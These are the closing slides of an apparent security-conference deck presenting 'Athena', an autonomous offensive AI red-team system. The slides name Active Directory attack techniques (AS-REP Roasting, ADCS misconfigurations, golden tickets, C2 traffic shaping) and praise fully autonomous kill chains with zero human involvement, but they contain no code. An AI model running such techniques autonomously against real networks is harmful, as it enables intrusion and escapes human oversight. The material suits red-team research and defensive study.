<div class="slide-eyebrow">Lessons / Key</div>
<div class="slide-h1">三個戰場心得</div>
<div class="slide-sub">不是工具清單 — 是這場攻防真正換掉的觀念。</div>

<div class="numbered-lines" style="margin-top: 1.8rem;">

<div class="numbered-line">
<div class="n">1</div>
<div class="body"><strong>強密碼不夠</strong> — 密碼噴灑全敗、AS-REP Roasting 一招拿下。LLM 不執著於密碼，看到 <code>ad.user_no_preauth</code> 立刻換路 — <strong>fact-driven 比經驗主義更冷血</strong>。</div>
</div>

<div class="numbered-line">
<div class="n">2</div>
<div class="body"><strong>ADCS 是 AD 的後門</strong> — ESC1〜ESC11 多種誤設定都能拿 Domain Admin。憑證模板的攻擊面比密碼大十倍，且大多數網域沒人在看 — Athena 把它變成一條穩定的 kill chain 步驟。</div>
</div>

<div class="numbered-line">
<div class="n">3</div>
<div class="body"><strong>AI 把 1 天的工作壓成 20 分鐘</strong> — 完整 kill chain 全程零人工。攻防不對稱已經改變 — 紅隊不需更聰明，只要<strong>更快迭代、更深的決策樹、更廣的平行戰線</strong>。</div>
</div>

</div>

<div class="bridge-bottom">
三個心得有了 — 下一張：那這套之後要往哪走？ →
</div>

---
transition: fade
---

<!-- Slide 56 from Harry's PPT — Ch6 · Roadmap (下一步 Roadmap) -->

<div class="slide-eyebrow">Roadmap / Next</div>
<div class="slide-h1">下一步 Roadmap</div>
<div class="slide-sub">OODA 不是終點，是持續迭代的引擎 — 接下來四個前線。</div>

<div class="kill-chain compact" style="margin: 1.6rem 0; gap: 0.8rem;">

<div class="kc-node recon">
<div class="label">Multi-domain</div>
<div class="sub">跨樹系 / 跨森林<br/>信任關係穿越<br/>Azure AD ↔ on-prem</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node exploit">
<div class="label">Stealth tier</div>
<div class="sub">降噪模式<br/>LOLBins 偏好<br/>C2 流量塑形</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node attacker">
<div class="label">Persistence</div>
<div class="sub">站穩後不離場<br/>golden ticket · DSRM<br/>跨重啟存活</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node attacker">
<div class="label">Federated LLM</div>
<div class="sub">在地推論<br/>敏感案件不出網域<br/>企業內可部署</div>
</div>

</div>

<div class="alert-box">
<strong>OODA 不是終點，是持續迭代的引擎。</strong> 每加一條前線，整個 doctrine 一起升級。
</div>

---
transition: fade
zoom: 0.92
---

<!-- Slide 57 from Harry's PPT — Ch6 · Positioning (Athena vs 現有 Offensive AI) -->

<div class="slide-eyebrow">Positioning / Compare</div>
<div class="slide-h1">Athena vs 現有 Offensive AI</div>
<div class="slide-sub">差別不在「用 LLM」，在於把軍事 doctrine 變成可執行系統。</div>

<div class="numbered-lines" style="margin-top: 1.8rem;">

<div class="numbered-line">
<div class="n">1</div>
<div class="body">
<strong>PentestGPT</strong> — Prompt loop + shell<br/>
<span style="color: var(--fg-dim); font-size: 0.95rem;">ChatGPT 對話式輔助，工程師仍需手動執行 + 回貼結果。無狀態、無自動執行、無風險控制。</span><br/>
<code style="color: var(--fg-dim); font-size: 0.85rem;">framework: prompt loop  ·  state: ✗  ·  auto: 半自動</code>
</div>
</div>

<div class="numbered-line">
<div class="n">2</div>
<div class="body">
<strong>Nebula / AutoAttacker</strong> — RAG + 固定工具<br/>
<span style="color: var(--fg-dim); font-size: 0.95rem;">RAG 找 exploit + 包 nmap/msf。partial state、無 doctrine、選工具靠 prompt template 而非動態路由。</span><br/>
<code style="color: var(--fg-dim); font-size: 0.85rem;">framework: RAG  ·  state: partial  ·  auto: ✗</code>
</div>
</div>

<div class="numbered-line">
<div class="n">3</div>
<div class="body">
<strong>Athena — OODA × C5ISR × MCP</strong><br/>
<span style="color: var(--fg-dim); font-size: 0.95rem;">雙 doctrine 驅動、PostgreSQL 持久 state、17 個 MCP server 動態路由、composite confidence + noise budget 量化決策。</span><br/>
<code style="color: var(--fg-dim); font-size: 0.85rem;">framework: OODA×C5ISR  ·  state: PostgreSQL  ·  auto: AUTO_FULL</code>
</div>
</div>

</div>

<div class="bridge-bottom">
差別不在「用 LLM」，在於<strong>把軍事 doctrine 變成可執行系統</strong>。
</div>

---
transition: fade
---

<!-- Slide 58 from Harry's PPT — Ch6 · Refrain (三條信條 · 整場簡報的鼓點) -->

<div class="slide-eyebrow">// THE THREE DOCTRINES :: REFRAIN</div>
<div class="slide-h1">三條信條 — 整場簡報的鼓點</div>
<div class="slide-sub">你已經聽完整場 — 但記得的應該只有這三條。</div>

<div class="numbered-lines" style="margin-top: 1.8rem;">

<div class="numbered-line">
<div class="n">1</div>
<div class="body">
<code style="color: var(--accent-green, #39FF6A); font-weight: 700;">FACT-DRIVEN</code> · <strong>AI 不靠直覺，靠寫進 Facts DB 的事實</strong><br/>
<span style="color: var(--fg-dim); font-size: 0.95rem;">每一個推薦都引用 fact · 每一次失敗都寫回歷史 · LLM 信心要過校正</span>
</div>
</div>

<div class="numbered-line">
<div class="n">2</div>
<div class="body">
<code style="color: var(--accent-green, #39FF6A); font-weight: 700;">DOCTRINE BEATS TOOLS</code> · <strong>武器庫人人有，差別在 doctrine</strong><br/>
<span style="color: var(--fg-dim); font-size: 0.95rem;">OODA × C5ISR 雙框架 · 17 個 MCP 工具是肌肉，不是大腦</span>
</div>
</div>

<div class="numbered-line">
<div class="n">3</div>
<div class="body">
<code style="color: var(--accent-green, #39FF6A); font-weight: 700;">TEMPO IS THE WEAPON</code> · <strong>速度差 30 倍不是更快，是換了一個維度</strong><br/>
<span style="color: var(--fg-dim); font-size: 0.95rem;">30s/loop · 平行 kill chain · 失敗不痛、隨時回頭</span>
</div>
</div>

</div>

---
layout: cover
class: 'text-center'
---

<!-- Slide 59 from Harry's PPT — Ch6 · Closing (AI 不會取代紅隊) -->

<div style="height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 0 4rem;">

<div class="slide-eyebrow" style="margin-bottom: 2rem;">// END OF BRIEFING</div>

<div style="font-size: 2.6rem; font-weight: 700; line-height: 1.4; max-width: 56rem; text-align: center;">
AI 不會取代紅隊。
</div>

<div style="font-size: 3rem; font-weight: 700; line-height: 1.4; margin-top: 1.4rem; color: var(--accent-green, #39FF6A); text-align: center;">
AI 會把紅隊的速度乘上 30 倍。
</div>

<div style="margin-top: 2.6rem; max-width: 56rem; text-align: left; line-height: 2; font-size: 1.05rem;">
<div>我們不是更快的工具 — <code style="color: var(--accent-green, #39FF6A); font-weight: 700;">doctrine beats tools</code></div>
<div>我們不是更聰明的 prompt — <code style="color: var(--accent-green, #39FF6A); font-weight: 700;">fact-driven, not vibe-driven</code></div>
<div>我們把 30 倍速度變成戰略優勢 — <code style="color: var(--accent-green, #39FF6A); font-weight: 700;">tempo is the weapon</code></div>
</div>

<div style="margin-top: 2.4rem; color: var(--fg-dim); font-size: 0.95rem; font-family: var(--font-mono, 'JetBrains Mono', monospace);">
Athena · OODA / C5ISR doctrine for offensive AI
</div>

</div>

---
layout: cover
class: 'text-center'
---

<!-- Slide 60 from Harry's PPT — Q&A -->

<div style="height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 0 4rem;">

<div style="font-size: 14rem; font-weight: 700; line-height: 1; color: var(--accent-green, #39FF6A); font-family: var(--font-mono, 'JetBrains Mono', monospace);">
?
</div>

<div style="font-size: 2.4rem; font-weight: 700; margin-top: 1.6rem; text-align: center;">
Questions &amp; Answers
</div>

<div style="margin-top: 1.4rem; color: var(--fg, #E8F0E8); font-size: 1.1rem; text-align: center;">
歡迎挑戰任何架構假設、攻擊細節、武器化路徑。
</div>

<div style="margin-top: 2.4rem; display: flex; gap: 3rem; color: var(--fg-dim); font-size: 0.95rem;">
<div>
<div style="color: var(--accent-green, #39FF6A); font-weight: 700; margin-bottom: 0.3rem;">Harry Chen</div>
<div><!-- TODO: contact --></div>
</div>
<div>
<div style="color: var(--accent-green, #39FF6A); font-weight: 700; margin-bottom: 0.3rem;">Alex Chih</div>
<div><!-- TODO: contact --></div>
</div>
</div>

<div style="margin-top: 2rem; color: var(--accent-green, #39FF6A); font-size: 0.9rem; font-family: var(--font-mono, 'JetBrains Mono', monospace);">
// AWAITING INPUT _
</div>

</div>

---
layout: cover
class: 'text-center'
---

<!-- Slide 61 from Harry's PPT — Thanks -->

<div style="height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 0 4rem;">

<div class="slide-eyebrow" style="margin-bottom: 2rem;">// MISSION COMPLETE :: END OF TRANSMISSION</div>

<div style="font-size: 6.5rem; font-weight: 700; line-height: 1; letter-spacing: 0.05em;">
THANK YOU
</div>

<div style="font-size: 2.4rem; font-weight: 500; margin-top: 1.4rem; color: var(--accent-green, #39FF6A);">
謝謝大家
</div>

<div style="width: 8rem; height: 3px; background: var(--accent-green, #39FF6A); margin: 2.4rem auto;"></div>

<div style="color: var(--fg, #E8F0E8); font-size: 1.2rem; letter-spacing: 0.05em;">
Harry Chen &nbsp;·&nbsp; Alex Chih &nbsp;·&nbsp; CYBERSEC 2026
</div>

<div style="margin-top: 2.4rem; color: var(--accent-green, #39FF6A); font-size: 0.9rem; font-family: var(--font-mono, 'JetBrains Mono', monospace);">
// CONNECTION CLOSED _
</div>

</div>
